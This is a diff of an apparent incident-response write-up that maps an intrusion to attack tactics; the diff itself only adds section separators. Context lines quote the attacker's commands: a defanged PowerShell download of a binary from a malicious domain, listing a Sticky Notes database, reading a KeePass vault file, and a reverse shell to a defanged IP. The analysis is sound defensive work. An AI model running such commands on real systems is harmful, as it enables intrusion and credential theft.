@@ -147,6 +147,7 @@ Evidence: The use of `iwr` (`Invoke-WebRequest`) to download binaries from a rem
 
 `iwr hXXp://files[.]bpakcaging[.]xyz/sq3[.]exe -outfile sq3[.]exe`
 
+---
 
 **Discovery** 
 
@@ -174,6 +175,7 @@ Evidence: The attacker also looks for and accesses a SQLite database file relate
 
 `ls AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite`
 
+---
 
 **Collection** 
 
@@ -187,6 +189,7 @@ Evidence: The attacker reads the entire contents of the target file into memory,
 
 `$file='protected_data.kdbx'; ... $bytes = [System.IO.File]::ReadAllBytes($file);`
 
+---
 
 **Command and Control (C2)**
 
@@ -202,6 +205,7 @@ Evidence: The main PowerShell reverse shell connects to a domain and IP address,
 
 Evidence: The exfiltration channel communicates with a malicious domain (`bpakcaging[.]xyz`) and an attacker-controlled server (`167[.]71[.]211[.]113`).
 
+---
 
 **Exfiltrated Data and Method**
 
